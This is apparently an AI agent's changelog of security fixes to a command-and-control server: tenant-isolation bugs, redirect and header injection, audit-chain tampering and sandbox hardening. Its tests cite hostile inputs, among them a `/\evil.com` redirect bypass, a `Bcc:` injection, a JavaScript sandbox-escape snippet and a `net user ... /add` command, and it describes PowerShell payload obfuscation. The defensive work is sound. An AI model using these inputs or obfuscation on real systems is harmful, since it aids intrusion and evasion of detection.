- **`findOrFail` ignores the caller's tenant, and the BOF handlers trusted it.** The shared helper takes the gin context and does a plain `First` by id, so every handler built on it is unscoped — and `bof_files` has no tenant column to scope with anyway. That left **uploaded BOF blobs** readable, **downloadable**, editable, deletable and **runnable** across tenants; a BOF is an executable the implant loads, so this was handing one tenant's tooling to another. Ownership now runs through the uploader, exactly like scripts: `bofScope` resolves the caller's tenant to its usernames, `findVisibleBOF` answers 404 for a foreign row, and the list/page queries use the same scope. **Evidence:** with the fix stashed the list answers with tenant 1's `"name":"victim.o"`; with it, tenant 2 gets nothing, cannot download or delete (row intact), and tenant 1 still can. The remaining **12** `findOrFail` sites are now **documented rather than silently wrong**: a new `AGENTS.md` section lists which tables carry no tenant column and how each must be scoped instead — `phishing_templates`, `phishing_campaigns`, `workflows`, `agent_groups`, `agent_tags`, `auto_tag_rules` and `custom_roles` are still **unscoped by design today**, and that is now written down where the next change will read it.
- **One tenant could read, overwrite and delete another tenant's scripts.** The `scripts` table has no tenant column, so ownership has to run through `created_by` — and none of the three handlers did it: the list returned **every tenant's script code**, and the save/delete looked rows up **by id alone**. The overwrite is the dangerous half: a script runs on **events**, so replacing a victim's code means the attacker's JavaScript executes **with the victim's identity** the next time their automation fires, which is code injection rather than a read-only leak. A `scriptScope` helper now resolves the caller's tenant to the set of usernames that belong to it and is applied to the list, the by-id lookup in save, and the by-id lookup in delete; a failed tenant lookup denies everything, and legacy rows with no creator stay visible only to unscoped (tenant 0) operators — handing a blank-owner row to whoever asks first would let any tenant claim it. **Evidence:** with the fix stashed the list answers with the victim's `"code":"return 'sekrit-code'"`; with it, tenant 2 sees nothing, cannot overwrite, cannot delete (404, row intact), while tenant 1's own admin still sees and deletes it — so the scope is not a blanket denial.
- **The scripting sandbox handed every tenant's data to any admin's script.** `handleAPIExecuteScript` builds the `agents`, `tasks` and `credentials` globals from three queries with **no tenant filter**, so an admin scoped to tenant 2 received tenant 1's agent hostnames, task command lines and credential usernames inside the goja VM. The handler's *optional single-target* narrowing **was** tenant-scoped, which is exactly what made the leak look handled. All three queries now run through `tenantScope`. **Evidence:** with the fix stashed, the test's script returns `{"agents":["sekrit-host"],"tasks":["sekrit-command"],"creds":["sekrit-user"],"n":1}`; with it, `n:0` and none of the values. Two false starts taught me something about the harness worth recording: my first version read `a.hostname` (goja exposes Go structs under their **exported** names, `Hostname`), so the one-element slice rendered as `[null]` and the test passed **while the leak was live** — which is why the final assertion checks the slice **length** as well as the values.
- **Two AI and scheduler paths verified safe, and the saved-views handler pair now has its first test.** Following the cross-tenant thread I checked where it could still hide: the AI tool layer resolves an agent through `resolveAIAgentID`, which is tenant-scoped (its unscoped fallback only fires for internal callers with **no principal**, and `currentAIPrincipal` always fills `UserID` from the user row), and the AI knowledge search filters through the caller's visible collections before touching chunks — the raw FTS match runs wider, but the result set is constrained, so nothing leaks. The knowledge and AI surfaces are therefore **verified**, not assumed. What was actually missing was coverage: `handleListSavedViews`/`handleCreateSavedView`/`handleDeleteSavedView` had **none**, and the area was untestable until the shared schema gained `SavedView` last round. The new test proves user 1 sees their own view, user 2 does **not**, user 2's delete-by-id answers **404** and leaves the row intact — the property the `user_id` filters were silently relying on.
- **The scheduler leaked every tenant's scheduled commands, and let one tenant cancel another's job.** `one_shot_tasks` has no tenant column of its own — the same shape as `agent_status_events` two rounds of this family ago — so both the listing and the cancel-by-id have to scope **through the agent**. Neither did: `handleListOneShotTasks` ran a bare `Find` and handed every operator every row, **including the command text and target agent id**, and `handleCancelOneShotTask` updated by id alone. Both now filter with `agent_id IN (SELECT id FROM implants [WHERE tenant_id = ?])`, and a failed tenant lookup answers an **empty set** rather than the world. Evidence: with the fix stashed the test prints tenant 1's view *containing tenant 2's `sekrit-command`*; with it, tenant 1 sees only its own row, cannot cancel the foreign one (404, row still `pending`), and can still cancel its own. Writing the test exposed the second half of this round: **ten tables were missing from the shared test schema** (`OneShotTask`, `SavedView`, `NotificationRoute`, six AI tables and the AI provider profile), so any test touching them died with "no such table" — the same trap that hid `AIAttachment` in round 165, now fixed for all of them at once.
- **Three handlers queued tasks on another tenant's implant.** The REST automation endpoint (`POST /api/v1/tasks`), the BloodHound collect endpoint and the cloud-credential steal endpoint all take `agent_id` from the **request body** and call `createTask` — which deliberately has no gin context (background callers) and therefore **cannot** scope by tenant — without validating the agent first. A tenant-1 operator or API key could queue a shell or collection task on a tenant-2 implant just by knowing its id. Each now resolves the agent through `getAgentOrFail` first. **Evidence, not assertion:** with the fix stashed, all three subtests fail with the created task echoed back — `{"tenant_id":1,"agent_id":"tenant-one-agent","type":"shell","command":"whoami"}` — while the fixed tree returns 404 and leaves **zero** task rows on the foreign agent. The same sweep confirmed four other `createTask` call sites are safe (diagnose validates via `getAgentOrFail`, macros filter the request against a tenant-scoped agent list, BOF validates, task rerun reuses an agent id from an already-authorized task); the scheduler path remains unverified and is worth a look next.
- **`check:error-sanitization` could only see one of the two ways a 5xx gets written — and the other way was leaking.** The gate inspected `respondError(…)` calls containing `StatusInternalServerError` and nothing else, so a raw error answered through `c.JSON(5xx, gin.H{"error": err.Error()})`, `c.String(5xx, …)`, `c.AbortWithStatusJSON(5xx, …)`, a **numeric** `500`, or `respondError` with `StatusServiceUnavailable`/`BadGateway`/`GatewayTimeout` was invisible. The broader scan found one immediately: `POST` on the WebRTC session endpoint answered **503** with `"WebRTC TURN relay is unavailable: " + err.Error()`, and that error carries the TURN resolver's host and port detail. It now answers `sanitizeError(err, "WebRTC TURN relay")` with the raw value left in the log line above it. The gate covers **1315** 5xx sites (was 1302) and a synthetic file proves both new shapes fail it.
- **Any authenticated role could start and stop the DNS C2 listener.** `registerDNSRoutes` hung `POST /api/dns/start` and `/stop` off the global `auth` group, which applies `AuthRequired` but **no permission check** — so a custom role with no listener grants (the built-in `user` role does hold `listeners.write`) could bind `:53` and rewrite the DNS listener configuration. The routes now carry `middleware.RequirePermission(db.PermListenersWrite)` (and the two reads carry `PermListenersRead`), like every other listener route; a test drives the real router as an unknown role and expects 403, then as an admin and expects 200. The reason it survived is the second half of this round: **`check:route-auth` only scanned files named `routes*.go`**, and 15 mutating routes live elsewhere — 10 in `server.go` (beacon/ExtC2, correctly implant-authenticated), 3 in `api.go`, 2 in `handler_dns.go`. The scan now covers **every** server file (402 mutating routes, up from 387) and the implant-facing endpoints are allowlisted **with their authentication story** so the gate's next finding is a real one.
- **The ACME handler wrote a TLS private key relative to the process working directory.** `handleACMECertProvision` built its output directory from `rawDataDir()` with no guard, so an empty `server.data_dir` resolved to the relative path `certs/<domain>` — and the traversal check in the same function passed it happily, because a relative path is a valid one. This is the last member of the family rounds 168–170 fixed (payloads, uploads, build output) and the worst contents of the four: `privkey.pem` would land somewhere nobody backs up, protects or cleans, at mode 0600 in a directory the server does not own. It now goes through `certsRootDir()`, which refuses an empty data dir like its siblings, and the family test covers it. A per-function sweep afterwards confirmed it was the last: every remaining `rawDataDir()` site is a **read** (serving a file or building a `serveFileSafe` allowlist), and the only writer that touches those directories already uses the guarded helper.
- **An implant could inject HTML into the operator's alert email.** `formatEmailBody` interpolated **Hostname, IP, OS and the event payload** straight into the mail body, and those values are **reported by the implant** — so a rogue or compromised beacon chooses what the operator's mail client renders: a credible "re-authenticate here" link inside a message the operator already trusts, or a tracking pixel that fires when the alert is opened. Every interpolated value is now HTML-escaped at the boundary (including the JSON payload), with the legitimate content still present so the template is not gutted. The same pass closed the header side: `buildMIMEMessage` wrote `From`/`To`/`Subject` verbatim, so a CR or LF could end the header block and add one (`Bcc:`, `Content-Type`); values are now **cut at the first line break** rather than folded into a space — folding would have kept the attacker's tail inside the `To` value, which is exactly what the failing test I wrote first showed. Tests pin both halves: no raw markup in the body while the escaped forms appear, and a `Bcc:`/`X-Injected:` attempt never becomes a header.
- **An unauthenticated open redirect on `/lang/set`.** The handler bounced back to the request's `Referer` when it "starts with `/` and not with `//`" — and a **backslash** walks around that: browsers normalise `\` to `/` in a `Location`, so a `Referer` of `/\evil.com` is fetched as `//evil.com` and lands on another host. The route is public (the language switcher must work on the login page), so this was an open redirect served from the console's own origin — exactly the shape a phishing link wants. The check is now a helper that also rejects backslashes and control characters (a `\r\n` would let the header be split) and requires the parsed reference to carry no scheme or authority. Tests pin eleven accepted and rejected shapes, and the handler itself is driven through a router so the 302 is real: a local path still redirects, `/\evil.com` does not. That handler had **0% coverage** before this round.
- **Pinned the cross-tenant case on the loot download path.** `GET /agents/:id/files/exfil/:filename` serves what an implant exfiltrated — the most valuable data in the installation — and it is safe only because `getAgentOrFail` is tenant-scoped. The existing tests covered a missing agent, a traversal filename and the happy path, but **not** the case that matters: an operator in tenant 2 who knows the exact agent id and filename. The new test seeds the file under tenant 1, proves tenant 1 can read it (so the 404 that follows is the tenant filter, not a missing file), and requires tenant 2 to get **404 rather than 403** — a 403 would confirm the agent exists and leak its existence across tenants.
- **The rate limiter — the component that decides whether throttling actually happens — had zero coverage.** Every token-bucket function was at **0%**: `NewTokenBucket`, `Allow`, `Tokens`, `Snapshot`, `SetWhitelist`, `GetBucket`, `evictOldest`, `LimitByUser`, `GetStatus`. A refill bug there is silent in both directions: the limit either never bites (an attacker gets unlimited login attempts) or bites forever (an operator is locked out of their own console). The new tests pin the arithmetic (3 tokens → three allows, a fourth refused, refill restores service after 10 ms, capacity stays a ceiling after a long idle), per-key bucket identity (the same key must not get a fresh bucket per request, or the limit resets itself), the **eviction bound** (rotating source addresses cannot grow the map past `maxBuckets`), the wire contract (**429 with `Retry-After` and `X-RateLimit-Remaining: 0`**, not a hang or a 500), and the whitelist escape hatch that makes the limiter safe to enable. `internal/server/middleware` **62.8% → 76.4%**.
- **Completed the beacon scan bound: the query string is not even parsed when it is pathological.** Last round capped the per-value decode work, but `url.ParseQuery` runs **before** that loop and allocates for every parameter, so a megabyte-long query still bought a megabyte of parsing on the unauthenticated endpoint. A query string over **64 KiB** is now skipped unparsed (the caller falls back to the request body), which sits far above a real beacon's short query and far below the pathological. Tested both ways: an over-cap query with a valid placed value at the very start is ignored, while the same value in a normal-sized query still resolves. Also worth recording from this round's proactive scans — **ignored database errors** (one, documented), **unchecked `Close`/`io.Copy` on write paths**, **`time.After` in loops** (every site is the timer being waited on, so nothing accumulates) and **unguarded goroutines** (the unguarded ones are fixed-size read loops; the ticker-driven loops all carry a recover) all came back clean, so no change was justified there.
- **The unauthenticated beacon endpoint did an unbounded amount of work per request.** `extractPlacedBody` scanned **every** query value and **every** cookie with the profile's transform chain, so a request carrying thousands of parameters bought thousands of base64/XOR decode passes before any beacon processing — on the one endpoint an attacker can hit without credentials. The scan is still by **value** (the parameter name rotates per beacon through the profile's pool) but it is now bounded by three caps: **64 candidates**, **32 KiB per value**, and a **256 KiB cumulative budget** across all placements, after which the function returns "no placed body" and the caller falls back to the request body. A real beacon sends one value of a few KiB, so the caps sit far above legitimate traffic and far below what makes the endpoint worth abusing. Tests pin both directions — a single placed value is still found, and a 4000-parameter request with the valid value at the end returns promptly instead of decoding the tail — plus the constants' sanity ranges, so a future "make it bigger" cannot quietly restore the unbounded scan.
- **Pinned the owner scoping of AI chat attachments, and fixed the test schema that hid it.** `handleAIAttachmentsList` filters by `session_id` alone — the security comes from the **session** being authorized by `(owner_id, tenant_id)` — so a same-tenant colleague must still not read another operator's attachments, which may contain anything they pasted. The new IDOR test proves the owner sees their own attachment, a colleague in the same tenant does not, and another tenant does not; none of it was tested before. Writing it surfaced a second problem: `AIAttachment` was **missing from the shared test schema** (`testutil.SetupTestDB`), so any test touching attachments failed with "no such table" — a gap that quietly discouraged exactly this kind of coverage. Added, and the shared helper now matches what production migrates.
- **The hot update's fail-closed signature rule is now pinned instead of implied.** `performHotUpdate` refuses when `crypto.require_release_signature` is set but `crypto.update_signing_key` is empty — the server-side half of the same promise the release workflow makes — and nothing tested it. The three-way policy now lives in `updateSignatureEnforced` (key present → verify; required without a key → refuse; neither → warn and fall back to same-origin checksums only), which the handler uses, and a table test covers all six combinations including whitespace-only keys. Extracting it also removed a now-unreachable duplicate branch from the handler. This matters more than it looks: the fallback path trusts a checksum fetched from the same origin as the binary, so the only thing separating "verified release" from "whatever that host served" is this refusal.
- **The password-reset flow's session revocation is now pinned.** Reading it confirmed the design is sound — `handleSetUserPassword` revokes every live session **row**, and the auth middleware re-reads that table on each request, so a stolen session dies immediately rather than waiting for cache or token expiry — but nothing tested it, and the property is one deleted call away from silently disappearing. The test seeds a live session for the target plus one for the admin, runs the reset through the real handler, and asserts the victim's token is revoked **while the admin's is untouched** (revoking everyone would be a denial of service, not a reset), and that a hash was stored. A second test keeps the tenant gate the handler already had: a tenant-1 admin resetting a tenant-2 user is refused, and the foreign session stays live — proving the refusal happened **before** the revoke, not after it.
- **A scoped API key kept its capabilities after its owner was demoted.** `RequirePermission` granted a scoped key whatever its scope set said, **without intersecting that set with the owner's current role**. The scope set is fixed when the key is created (and was checked against the creator's grants then), so demoting an owner from admin to user left their key holding every capability it was born with — a revocation path that silently did nothing, since the API-key auth path only re-checks `is_active`, not the role. The check now requires **both**: the key carries the scope **and** the owner's role has that permission; otherwise the request is refused and logged with the failing permission and role. Tests pin all four quadrants — demoted owner refused, admin owner allowed, missing scope refused for an admin owner too, and a plain-user owner whose role *does* carry the permission still allowed — plus the legacy full-access key path (nil scope set) still falling through to normal role logic, unchanged. Middleware and server suites green.
- **The WASM sandbox's threat model is now executable.** `docs/PLUGIN_TIERS.md` claims the untrusted tier has "no WASI, no filesystem/network/env" and a 16 MiB memory cap — but nothing asserted that a module importing a host function could not simply be instantiated. The new test builds real modules in-process (hand-encoded binary, no toolchain) that import host functions and requires each to be **refused before `run()` is reached**: `wasi_snapshot_preview1.fd_write`, `fd_write`'s sibling `environ_get`, `wasi_unstable.fd_read`, `env.getenv`, and — the interesting pair — the one host module that exists, `forgec2`, with functions it does not expose (`exec`, `http_request`). The refusal must **name the host module**, so an operator sees why their plugin was rejected. A positive case pins the other half: `forgec2.log` with its declared `(i32,i32)->()` signature is accepted, which is what proves the negative cases fail for the *right* reason (a wrong signature would have looked like a missing module). The memory constant was verified too: `wasmMemoryPages = 256` × 64 KiB = the documented 16 MiB.
- **The function that decides how much obfuscation a payload gets had no test at all.** `PresetForLevel` maps the operator-facing level (`none`/`light`/`standard`/`heavy`, plus aliases and case/whitespace noise) to the actual pipeline, and it was at **0% coverage** — a mapping that silently degraded to the legacy `[ScriptBlock]::Create` shape would ship plain base64 while the operator believed they had asked for heavy. Tests now pin the mapping for every accepted spelling (including `low`/`med`/`high`, mixed case and padding) **and** the end-to-end result: each level produces the launcher it promises — `-enc` for light, the `-bxor $k` XOR stub for standard/heavy — and the standard/heavy payload **decodes back** to the original command, because a launcher that does not decode is a payload that does not run. An unknown level keeps the documented legacy behaviour rather than silently enabling the heavy pipeline, so a typo stays visible in the output. `PresetForLevel` **0% → 100%**, `internal/obfuscation` **89.9% → 93.5%**.
- **Closed a tenant-isolation question the code had left open in a comment.** `agentHostnamesByID` carried "Tenant isolation of this endpoint is a separate open question" and skipped scoping on the grounds that the previous per-row SELECT had not scoped either — a reason that describes history, not safety. Looking at the caller settles it: `handleAIPendingTasks` fills the ids from a task list that **is** tenant-scoped, so the ids are the caller's own, and narrowing the lookup again would blank the hostname on a row whose task and agent tenants disagree — hiding a data problem instead of showing it. The comment now states that reasoning and points at a test; two tests pin the endpoint: a tenant-1 caller sees **its own** pending task with its hostname while a tenant-2 task (and its command and hostname) is absent, and five tasks sharing one agent all resolve the hostname, so the single-query batching that made this page cheap cannot regress into per-row lookups unnoticed.
- **The assistant's situation snapshot reported another tenant's alert volume.** `collectSituation` narrows every counter it builds — agents, listeners, pending approvals, credentials — but the active-alert count was a bare `Count()` with no scope, so a tenant asking the assistant for a summary learned how noisy another tenant's estate was (`db.Alert` carries the alerting agent's tenant precisely so this cannot happen). The count now goes through the same `scoped` closure as its neighbours. Tests: a tenant-1 snapshot reports **2** active alerts with five planted across two tenants, while the unscoped legacy view still reports **5**; and a broader guard plants distinctive rows on tenant 2 and asserts a tenant-1 snapshot is **zero** for every other counter too, so a future query added without the scope closure fails there instead of leaking quietly. `collectSituation` **98%**.
- **Two queries in the AI report ignored the tenant boundary.** `buildAIMarkdownReport` carefully narrows tasks and credentials to the caller's visible agents — except for the **MITRE coverage census**, which counted task types from **every** tenant (so one team's report revealed which techniques another team had run), and the **"Recent failures"** section, which listed failed tasks from **all** tenants including their `command` text and error strings. Both now use the same scope closure as the rest of the report, and `mitreCoverageCounts` takes that scope as a parameter so the AI-suggestion caller can narrow it to the agent's own tenant too (it was global there as well). A test plants a distinctive failed command on a second tenant and asserts it is absent from the report **while the caller's own failure is still present** — so the test cannot pass by producing an empty report. Deliberately kept: the unscoped (legacy single-tenant) view still sees everything, asserted in the same test.
- **`BackupManager.Stop` now waits for its goroutine, which de-flaked a test and closes a real shutdown race.** `Stop` closed the ticker and returned, so the schedule goroutine could still be inside `PerformBackup` — writing files — while `Shutdown` proceeded to close the database, and while a test removed its temp dir (it failed once in a full run and passed on retry). `Start` now publishes a `done` channel that the goroutine closes, and `Stop` waits on it with a 30-second bound and logs if a run is still in flight. The test's `runMu` workaround is gone, replaced by the guarantee.
- **Multi-chunk file push was not actually chained.** The push path called `chainForPush` once per chunk, and that function keys the chain by the **chunk's own task id** — so every chunk started from the zero seed. Each chunk was still integrity-protected against content tampering, but nothing tied chunk *N* to chunk *N−1*: a relay could reorder or replace chunk 2 onwards and every one would verify on its own, which is precisely what the code comment claims the chain prevents. Push links are now built by a stateless `chainForPushSequence` with the previous chunk's MAC threaded through the loop, so the sequence is a real chain (verified by test: chunk 2's `prev` equals chunk 1's MAC, and the agent-side recomputation matches), a swapped pair no longer verifies, and a missing chain key fails closed instead of emitting unsigned chunks. This closes the push direction of the same guarantee the pull direction already had.
- **A replayed file chunk could be accepted again after its own rejection.** `verifyAndCommitChain` resolved a failed link by **deleting the chain state**, which looks like "reset so the transfer cannot continue" but actually re-zeroed the previous-MAC seed — so the *same* chunk matched again on the next attempt. A concurrent-duplicate test made it visible: with eight goroutines presenting an identical link, **four were accepted**. Two separate flaws fed it: the failure path reset instead of locking the transfer, and the (then) poison check sat **outside** the commit lock, so a goroutine that had passed it could still match after another had reset the seed. Fixed by (1) poisoning the transfer on any failure — mismatch, malformed MAC or a stripped MAC — and refusing **every** later chunk for that task, including a legacy empty-MAC one, until the task lifecycle calls `reset`; and (2) holding **one** lock across the poison check, the legacy downgrade check, the comparison and the commit. This is a deliberate semantic change: a mid-transfer failure now needs an explicit new transfer rather than silently restarting, and an existing test that asserted the old "retry works after a reset" behaviour was updated with the reason. New tests cover replay, mid-transfer MAC stripping, malformed links, the eight-way concurrent duplicate (**exactly one** acceptance) and the sweep expiring a poisoned transfer. `poisonTransferLocked` **100%**, `verifyAndCommitChain` **90%**.
- **The audit verifier was reading the WRONG END of the table.** `verifyAuditChain` queried `ORDER BY id ASC LIMIT n`, which returns the **oldest** n rows — while its own comment says it walks "the newest `limit` audit rows". With `auditReadyChainWindow = 200` (minutes of operation on a real server), `/ready` and `/api/v1/health` re-checked the same ancient block **forever**, so tampering with recent rows — the ones anyone would actually touch — was never detected. That is the worst possible failure for this feature: the alarm that exists to notice tampering was pointed at history. The query now takes the newest window (`ORDER BY id DESC`) and reverses it in memory, because the chain walk needs ascending order and the anchor lookup needs `rows[0]` to stay the oldest row **of the window**. Two tests pin it at both ends: tampering with the **newest** row must report that row as `first_bad_id`, and deleting a row **near the head** must break the link — neither was detectable with the oldest-window read. `verifyAuditChain` **93.5%**.
- **Pinned the script VM's surface, and recorded what actually bounds a runaway script.** The capability bridge is meant to be the only way out of the sandbox, so the test asserts the VM exposes **no host references**: `process`, `module`, `exports`, `global`, `Deno`, `Bun`, `window`, `document`, `navigator` are all undefined, the classic Node sandbox break `(function(){}).constructor("return typeof process")()` still finds nothing, and `require("child_process")` cannot resolve. Writing it also settled a wrong assumption of mine: unbounded recursion does **not** raise a stack error in this VM — a measured run burned the full **30-second** interrupt budget and returned "script execution timeout". So the interrupt is the real bound on a runaway script (which is why it must stay), and the behaviour is recorded in the test file rather than paid for with a 30-second CI test.
- **An ExtC2 ciphertext was classified as loot plaintext — and the vault sweep would have corrupted it.** `DecryptLootState` treated every value without the `FC2ENC:` prefix as "legacy plaintext", including a `FC2EXT:` value: `DecryptLoot` handed the **ciphertext** back as if it were the secret, and `EncryptLootPlaintext` — the vault sweep's migration step — would have sealed it **inside** FC2ENC, after which every read returned the `FC2EXT:` *string* instead of the token. `FC2EXT:` is now classified as undecryptable by the loot path, so the sweep reports an error rather than silently double-encoding, and the two markers stay separated in both directions (the ExtC2 key cannot open loot ciphertext; a plaintext legacy loot value still passes through untouched). Found while checking the key-isolation claim; the test pins the round-trip, the refusal, the sweep behaviour and the isolation.
- **The plugin trust branches that decide whether an untrusted package loads are now covered.** `VerifyPackageWithPolicy` was at 72%; the design was already right — the digest is **recomputed from disk first** (so an edited helper is caught) and the signature covers the **digest string** (so a swapped digest invalidates the signature too), with `manifest.yaml` excluded from the digest so a package can carry its own stamp without becoming self-referential. What was untested were the outcomes: a signature from a **different trusted key** is refused ("not valid for any configured"), a signature with **no trusted keys configured** is an error rather than a pass, a **malformed** signature is refused, digest-only is accepted when `require_signed` is off but refused when it is on, and a file **edited after signing** fails on `digest mismatch` before the signature is consulted. `VerifyPackageWithPolicy` **72% → 92%**.
- **The scripting bridge's permission gate had no tests at all.** Every script runs its bridge calls with the **caller's** privileges (`hasPerm` → `RoleHasPermissionDB`), and that single check is what stops a low-privilege operator's script from sending tasks or reading agents — but nothing pinned it. The tests now cover: a permissionless role is refused by `SendTask`, `GetAgent`, `ListAgents`, `Query` **and** `HTTPRequest` (all five entry points), while an admin passes; a caller scoped to tenant 1 is refused another tenant's agent with **"not found"** (not an error that confirms it exists), while an unscoped system caller keeps the legacy single-tenant behaviour; and a script-created task carries the caller in `created_by`, which is what stops a lone operator from creating *and* self-approving a dangerous task through a script. `hasPerm` and `scopeImplants` **100%**, `SendTask` **88%**, `GetAgent` **100%**.
- **The notification channel is now pinned where it was only careful.** This path was already doing the right things — re-validating the target at **delivery** time (stored rows may predate validation, or DNS may have changed) and logging the underlying `url.Error` cause instead of the URL, because a Telegram/Discord delivery URL **is** the credential. Both are now tested so a future refactor cannot quietly drop them: a legacy row pointing at loopback, `169.254.169.254`, RFC1918 or `[::1]` is refused with a "rejected" error rather than dialled, an unknown channel is refused before any network work, and the route list keeps a Telegram **chat id** visible (an operator needs it) while masking Discord/Slack/webhook targets. The masked-round-trip case is covered too: a UI that posts the mask back must not overwrite the stored credential with the literal mask. `validateNotificationRoute` **91%**, `sendNotificationRoute` **32% → 41%**.
- **A build job could be read by another tenant.** Build jobs live in a process-wide map and the status/download endpoints looked a job up by **id alone**, returning its `c2_url`, profile name and the built artifact — which embeds the listener URL and the malleable profile. Ids are UUIDv7, so leaking one needs a side channel, but the read was unrestricted all the same. `BuildJob` now carries the `TenantID` of the tenant that started it (the four generators stamp it), and both endpoints go through `buildJobVisibleTo`: an unscoped caller keeps the single-tenant view, a job with no tenant (created by a path that predates the field) stays readable, and anything else is answered **404 rather than 403** so a foreign build is not even confirmed to exist. Found alongside it: `startBuildJobWithProfile` panicked on a nil map for any server that was not built through `NewServer`; it now initialises the map lazily. `buildJobVisibleTo` and `startBuildJobWithProfile` **100%**, `internal/server` stays **65.8%**.
- **The bulk-command history crossed tenant boundaries.** `bulkHistory` is a process-wide slice, and both readers (`handleBulkResults` and `apiBulkResults`) returned **all** of it: any operator with `tasks:read` saw every tenant's batch rows — including the `command` string, which for a batched shell task can carry a password (the test uses `net user admin P@ssw0rd /add` as the example that used to leak). `BulkResult` now carries the caller's `TenantID`, stamped where the row is produced, and both endpoints read through one `bulkHistoryFor` helper that filters by the caller's tenant (a tenant-less caller keeps the unscoped single-tenant view). Tests cover the filter, both endpoints end to end (asserting the foreign command and its password are absent), the producer stamping, and the history cap. `bulkHistoryFor` **100%**, `internal/server` **65.7% → 65.8%**.
- **The chain head is now anchored outside the audit table.** The verifier could only prove internal consistency, and an attacker with write access can recompute every hash and keep the table self-consistent — the one gap the unkeyed hash leaves. Each committed audit batch now appends the new head to `data/audit-anchor.log` (append-only, 0600, resolved once at startup), and `verifyAuditChain` fails with "chain head does not match the anchor file" when the table's head disagrees. A fresh install with no anchor file is not a failure, and deleting old rows (a purge) does not trip it, because the newest hash is untouched. Tests pin the write, the whole-table rewrite being caught even though every row still matches its own hash, the no-anchor case, and the purge case.
- **A deadlock I introduced, and the guard against it.** The first version of the anchor called `rawDataDir()`, which takes `configMu.RLock` — but several handlers audit while holding `configMu` for **write** (config saves record themselves), and Go's `RWMutex` is not reentrant, so the pair hung the request and the full suite **timed out at 900s instead of failing**. The path is now resolved once in `initAuditAnchor()` from `Run()`, so the audit path takes no config lock, and a regression test audits under a held write lock with a 5-second deadline so this can only fail loudly, never hang.
- **The audit purge destroyed history without leaving a trace — and tripped the new chain verifier.** `handlePurgeAuditLogs` deleted every row older than the window and recorded nothing, even though destroying audit history is exactly the operation that must describe itself (and the code's own comments say a purge must never erase the tamper chain). It now counts first, writes an `audit_purge` marker **before** deleting (so the delete cannot remove it) naming the row count and the window, then purges. Second problem, found by testing the interaction: the new verifier reported a **legitimate purge as tampering**, because removing the oldest rows breaks the previous-hash link at the new head. The verifier now accepts a discontinuity **only at the window start when the id sequence has a gap** (proof that rows were removed), counts it in the verdict as `discontinuities`, and still fails on an interior deletion where the neighbours survive. `handlePurgeAuditLogs` **79%**, `verifyAuditChain` **89%**.
- **The audit sanitizer could be bypassed, and one caller used the bypass to store a webhook URL.** `buildAuditEntries` masked secrets in `Details`/`Error`, but `flushAuditEntries` also accepts **pre-built `db.AuditLog` rows** — and the webhook path builds them directly, so its `Webhook <name> -> <url>: <status>` detail went to the database verbatim. A webhook URL is a credential, and the pattern-based sanitizer does not even catch a Slack-style URL (it has no `key=` to match). The sanitizer now also runs in `persistAuditBatch`, the single choke point before the database, so every path — including future direct-row callers — is covered; the webhook detail redacts the URL explicitly while keeping host and status readable. Tests pin a direct-row flush (`password=`, a JSON `api_key`, an `Error` field) and that a benign detail is left untouched. `persistAuditBatch` and `webhookAuditDetails` **100%**.
- **The same leak existed on two more outbound paths.** Following the webhook fix: (1) the task-callback handler logged `task.CallbackURL` verbatim in all four of its log lines — including the SSRF rejection — and callbacks are operator-supplied URLs that may embed a token; (2) the AI stream logged the provider URL, and provider URLs routinely carry the key in the query string (`?key=AIza…` for Gemini-style endpoints).
